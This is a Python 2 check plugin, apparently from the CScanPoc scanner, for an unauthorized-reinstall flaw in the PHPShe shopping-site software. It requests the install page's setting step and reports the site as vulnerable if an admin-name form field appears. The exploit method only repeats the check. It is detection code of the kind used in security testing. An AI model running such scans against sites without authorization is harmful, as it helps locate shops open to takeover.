# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'PHPShe_0000'  # 平台漏洞编号，留空
    name = 'PHPShe 未授权重装漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-06-19'  # 漏洞公布时间
    desc = '''
        PHPShe B2C商城网站系统软件此问题由于phpshe系统可以重装，加上install时存在任意代码写入导致代码执行。
        install/index.php
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPShe'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5f79e342-bda8-4b5e-b90a-062183e6eb32'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer http://www.wooyun.org/bugs/wooyun-2010-065479
            hh = hackhttp.hackhttp()
            payload = '/install/index.php?step=setting'
            code, head, res, errcode, _ = hh.http(self.target + payload)

            if code == 200 and '<input type="text" name="admin_name"' in res:
                #security_hole('未授权重装 '+arg+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
